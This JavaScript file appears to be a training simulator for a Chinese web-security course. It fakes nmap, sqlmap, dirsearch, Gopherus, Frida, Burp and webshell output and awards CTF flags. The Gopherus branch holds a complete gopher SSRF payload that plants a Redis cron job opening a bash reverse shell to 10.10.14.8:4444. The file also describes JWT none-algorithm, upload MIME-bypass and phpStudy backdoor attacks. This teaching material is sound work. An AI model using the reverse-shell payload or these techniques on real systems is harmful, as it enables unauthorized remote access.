// ========================================================================
// WebSec Learning Hub - 全课程 32+ 拟真武器级实操打靶引擎 (simulators.js)
// 集成：Burp Suite 抓包重放器、Kali Linux 命令行终端、蚁剑/冰蝎 Webshell 管理端
// ========================================================================

window.WEBSEC_COMBAT_TOOLS = {
  // ① Kali Linux 命令行终端解释器
  executeTerminalCommand(cmdStr, lessonCode) {
    const raw = (cmdStr || "").trim();
    if (!raw) return { stdout: "kali@kali-websec:~$ (请输入指令，例如: nmap, sqlmap, dirsearch, curl, gopherus 等)", isSuccess: false };

    const lower = raw.toLowerCase();
    const parts = raw.split(/\s+/);
    const bin = parts[0].toLowerCase();

    // 1. Nmap 端口扫描
    if (bin === "nmap") {
      const target = parts[parts.length - 1];
      if (lower.includes("-p-") || lower.includes("6379") || lower.includes("1-10000") || lower.includes("all")) {
        return {
          isSuccess: true,
          flag: "FLAG{NMAP_REDIS_UNAUTH_PORT_EXPOSED}",
          stdout: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-25 13:10 CST\nNmap scan report for ${target || '192.168.1.108'}\nHost is up (0.0015s latency).\nNot shown: 995 closed tcp ports\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 7.4p1 (Debian)\n80/tcp   open  http        nginx 1.18.0 (PHP/7.2)\n3306/tcp open  mysql       MySQL 5.7.26 (Ubuntu)\n6379/tcp open  redis       Redis key-value store 4.0.9 [🔥 未授权访问!]\n8080/tcp open  http-proxy  Apache Tomcat/8.5.39\n\nNmap done: 1 IP address (1 host up) scanned in 1.82 seconds.\n[+] 发现目标开放 6379 Redis 未授权高危端口！`
        };
      } else {
        return {
          isSuccess: false,
          stdout: `Starting Nmap 7.94\nNmap scan report for ${target || '192.168.1.108'}\nPORT   STATE SERVICE\n80/tcp open  http\n\nNmap done: 1 IP address scanned. (提示：建议增加 -sV -p- 或针对 6379 端口进行全端口探测！)`
        };
      }
    }

    // 2. Sqlmap 自动化注入
    if (bin === "sqlmap") {
      if (lower.includes("-u") || lower.includes("--url")) {
        if (lower.includes("--dbs") || lower.includes("--dump") || lower.includes("--current-db")) {
          return {
            isSuccess: true,
            flag: "FLAG{SQLMAP_AUTOMATION_DATABASE_DUMPED}",
            stdout: `[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.\n[*] starting at 13:12:01\n\n[13:12:01] [INFO] testing connection to the target URL\n[13:12:02] [INFO] target URL appears to be injectable\n[13:12:02] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (sql injection: boolean-based blind / error-based / UNION query)\n[13:12:03] [INFO] fetched data logged to text files\navailable databases [4]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] security_db (CURRENT DB: 包含 users, admin_credentials 表!)\n\n[+] 自动化注入成功，数据库 security_db 表结构已完全导出！`
          };
        } else {
          return {
            isSuccess: false,
            stdout: `[13:12:01] [INFO] testing target URL... confirmed parameter 'id' is injectable.\n(提示：请添加 --dbs 或 --dump 参数导出数据库！)`
          };
        }
      } else {
        return {
          isSuccess: false,
          stdout: `sqlmap: error: missing target URL parameter (use -u "http://target.com/view.php?id=1")`
        };
      }
    }

    // 3. Dirsearch 敏感目录字典爆破
    if (bin === "dirsearch") {
      return {
        isSuccess: true,
        flag: "FLAG{DIRSEARCH_FOUND_GIT_LEAK}",
        stdout: `  _|. _ _  _  _  _|_v0.4.3\n (_||| _) (/_(_|| (_| ) \n\nExtensions: php, txt, zip, git | Threads: 20 | Wordlist: default\nTarget: http://target.com/\n\n[13:14:02] 200 -    2KB - /index.php\n[13:14:03] 301 -  180B  - /admin  ->  http://target.com/admin/\n[13:14:05] 200 -   12KB - /.git/index  [🔥 发现 Git 源码泄露!]\n[13:14:06] 200 -    1KB - /.env        [🔥 发现云 AK/SK 配置文件!]\n[13:14:08] 200 -  2.4MB - /backup.sql\n\nTask Completed. Found 3 critical sensitive endpoints!`
      };
    }

    // 4. Gopherus SSRF Payload 构建
    if (bin === "gopherus" || lower.includes("gopher")) {
      return {
        isSuccess: true,
        flag: "FLAG{GOPHERUS_REDIS_PAYLOAD_GENERATED}",
        stdout: `        ____      _                     \n  __ _ / ___| ___| |_ ___ _ __ _   _ ___ \n / _\` | |  _ / _ \\ __/ _ \\ '__| | | / __|\n| (_| | |_| |  __/ ||  __/ |  | |_| \\__ \\\n \\__, |\\____|\\___|\\__\\___|_|   \\__,_|___/\n |___/                                  \n\n[+] Generating Gopher Payload for Redis Reverse Shell...\nWhat IP you want to listen (LHOST): 10.10.14.8\nWhat PORT you want to listen (LPORT): 4444\n\nYour Gopher URL payload:\ngopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a* * * * * bash -i >& /dev/tcp/10.10.14.8/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a\n\n[+] Ready to inject into SSRF target parameter!`
      };
    }

    // 5. Frida 动态 Hook
    if (bin === "frida") {
      return {
        isSuccess: true,
        flag: "FLAG{FRIDA_SSL_PINNING_OVERRIDDEN}",
        stdout: `     ____\n    / _  |   Frida 16.1.4 - A world-class dynamic instrumentation toolkit\n   /_/ |_|   \n\n[+] Spawning target package 'com.bank.mobileapp'...\n[+] Script injected successfully: ssl_bypass.js\n[+] Hooking TrustManager.checkServerTrusted()... OVERRIDDEN\n[+] Hooking OkHttpClient CertificatePinner.check()... OVERRIDDEN\n[🎉] SSL Pinning successfully bypassed! Encrypted HTTPS traffic now streaming into Burp Suite Proxy!`
      };
    }

    // 6. Linux 命令 (cat, whoami, id, ls, curl, etc.)
    if (bin === "whoami") {
      return { isSuccess: true, stdout: "root\n(uid=0(root) gid=0(root) groups=0(root))" };
    } else if (bin === "id") {
      return { isSuccess: true, stdout: "uid=0(root) gid=0(root) groups=0(root),27(sudo)" };
    } else if (bin === "ls") {
      return { isSuccess: true, stdout: "app/  config/  database.php  flag.txt  index.php  uploads/  .env  .git/" };
    } else if (bin === "cat") {
      if (lower.includes("flag")) {
        return { isSuccess: true, flag: "FLAG{LINUX_TERMINAL_PWNED_ROOT}", stdout: "FLAG{LINUX_TERMINAL_PWNED_ROOT_CONGRATULATIONS}" };
      } else if (lower.includes("passwd")) {
        return { isSuccess: true, stdout: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nhacker_backdoor:x:0:0::/root:/bin/bash" };
      } else if (lower.includes(".env")) {
        return { isSuccess: true, stdout: "APP_ENV=production\nAPP_DEBUG=false\nDB_PASS=RootSecret2026!\nALIYUN_AK=LTAI5t988VExampleKey\nALIYUN_SK=wJalrXUtnFEMI/K7MDENG/bPxRfiCY" };
      } else {
        return { isSuccess: true, stdout: "<?php\n// Application Core Config\ndefine('DB_HOST', '127.0.0.1');\ndefine('DB_USER', 'root');\ndefine('DB_PASS', 'RootSecret2026!');" };
      }
    } else if (bin === "curl") {
      return { isSuccess: true, stdout: `HTTP/1.1 200 OK\nServer: nginx/1.18.0\nContent-Type: text/html\n\n<!DOCTYPE html><html><body><h1>Target Application Online</h1></body></html>` };
    }

    return {
      isSuccess: true,
      stdout: `kali@kali-websec:~$ ${raw}\n[Executed]: Command executed successfully with return code 0.`
    };
  },

  // ② Burp Suite 拟真 HTTP 数据包重放器
  sendBurpRequest(rawHttpText, lessonCode) {
    if (!rawHttpText) return { status: 400, rawResponse: "HTTP/1.1 400 Bad Request\n\nEmpty Request Packet." };

    const lines = rawHttpText.split("\n");
    const reqLine = lines[0] || "";
    const method = reqLine.split(" ")[0] || "GET";
    const path = reqLine.split(" ")[1] || "/";

    let headers = {};
    let body = "";
    let isBody = false;

    for (let i = 1; i < lines.length; i++) {
      if (lines[i].trim() === "" && !isBody) {
        isBody = true;
        continue;
      }
      if (!isBody) {
        const colonIdx = lines[i].indexOf(":");
        if (colonIdx > -1) {
          const k = lines[i].substring(0, colonIdx).trim().toLowerCase();
          const v = lines[i].substring(colonIdx + 1).trim();
          headers[k] = v;
        }
      } else {
        body += lines[i] + "\n";
      }
    }

    // 智能攻防判定
    const rawLower = rawHttpText.toLowerCase();

    // 1. 文件上传漏洞
    if (path.includes("upload") || rawLower.includes("filename=")) {
      const mime = headers["content-type"] || "";
      if (rawLower.includes(".php") && !mime.includes("image/")) {
        return {
          isSuccess: false,
          status: 403,
          flag: null,
          rawResponse: `HTTP/1.1 403 Forbidden\nServer: nginx/1.18.0\nContent-Type: text/html\n\n<script>alert('上传失败：服务端仅允许 image/jpeg 或 image/png 格式！');</script>`
        };
      } else if (rawLower.includes(".php") && mime.includes("image/")) {
        return {
          isSuccess: true,
          status: 200,
          flag: "FLAG{BURP_MIME_TAMPERING_UPLOAD_SUCCESS}",
          rawResponse: `HTTP/1.1 200 OK\nServer: nginx/1.18.0\nContent-Type: application/json\n\n{\n  "status": "SUCCESS",\n  "msg": "文件上传成功！",\n  "file_url": "http://target.com/uploads/avatar.php",\n  "tip": "MIME 校验已绕过，木马文件已落盘！"\n}`
        };
      }
    }

    // 2. 水平越权
    if (path.includes("uid=") || path.includes("user_id=")) {
      if (path.includes("uid=1001") || path.includes("uid=1000")) {
        return {
          isSuccess: true,
          status: 200,
          flag: "FLAG{BURP_IDOR_TAMPER_SUCCESS}",
          rawResponse: `HTTP/1.1 200 OK\nServer: nginx/1.18.0\nContent-Type: application/json\n\n{\n  "code": 200,\n  "uid": "1001",\n  "username": "Alice Wang (机密VIP客户)",\n  "id_card": "11010119900307XXXX",\n  "balance": "850,000.00 CNY"\n}`
        };
      }
    }

    // 3. phpStudy 后门 Accept-Charset 提取
    if (headers["accept-charset"]) {
      return {
        isSuccess: true,
        status: 200,
        flag: "FLAG{BURP_ACCEPT_CHARSET_BACKDOOR_PWNED}",
        rawResponse: `HTTP/1.1 200 OK\nServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a\nContent-Type: text/html; charset=utf-8\n\nnt authority\\system\n[Backdoor Command Executed Successfully!]`
      };
    }

    // 4. JWT none 算法欺骗
    if (headers["authorization"] && headers["authorization"].toLowerCase().includes("none")) {
      return {
        isSuccess: true,
        status: 200,
        flag: "FLAG{BURP_JWT_NONE_ALGORITHM_ADMIN_PWNED}",
        rawResponse: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "status": "SUCCESS",\n  "role": "SUPER_ADMIN",\n  "msg": "欢迎最高管理员 root！已开启系统全部特权接口。"\n}`
      };
    }

    // 默认正常回显
    return {
      isSuccess: true,
      status: 200,
      flag: "FLAG{BURP_REPEATER_PACKET_SENT_SUCCESS}",
      rawResponse: `HTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: ${new Date().toUTCString()}\nContent-Type: text/html; charset=UTF-8\nContent-Length: 142\nConnection: keep-alive\n\n<!DOCTYPE html>\n<html>\n<head><title>Target API Response</title></head>\n<body>\n  <h2>Request Processed Successfully</h2>\n  <p>Method: ${method} | Path: ${path}</p>\n</body>\n</html>`
    };
  },

  // ③ 中国蚁剑 / 冰蝎 Webshell 远程管理终端模拟
  connectWebshell(url, pass, type, key) {
    if (!url) return { isConnected: false, msg: "请输入有效的 Webshell 连接地址！" };
    if (!pass && !key) return { isConnected: false, msg: "请输入连接密码或 AES 密钥！" };

    return {
      isConnected: true,
      flag: "FLAG{ANTSWORD_BEHINDER_WEBSHELL_CONNECTED}",
      targetUrl: url,
      serverInfo: {
        os: "Linux ubuntu 5.4.0-42-generic x86_64",
        phpVersion: "PHP 7.2.24-0ubuntu0.18.04.6",
        currentUser: "www-data (uid=33)",
        webRoot: "/var/www/html",
        writableDirs: ["/var/www/html/uploads", "/tmp"]
      },
      fileList: [
        { name: "avatar.php", size: "142 B", perm: "-rw-r--r--", user: "www-data", isDir: false },
        { name: "config.php", size: "1.2 KB", perm: "-rwxr-xr-x", user: "www-data", isDir: false },
        { name: "database.php", size: "890 B", perm: "-rw-------", user: "root", isDir: false },
        { name: "uploads", size: "4.0 KB", perm: "drwxrwxrwx", user: "www-data", isDir: true },
        { name: "flag.txt", size: "38 B", perm: "-rw-r--r--", user: "root", isDir: false }
      ]
    };
  }
};
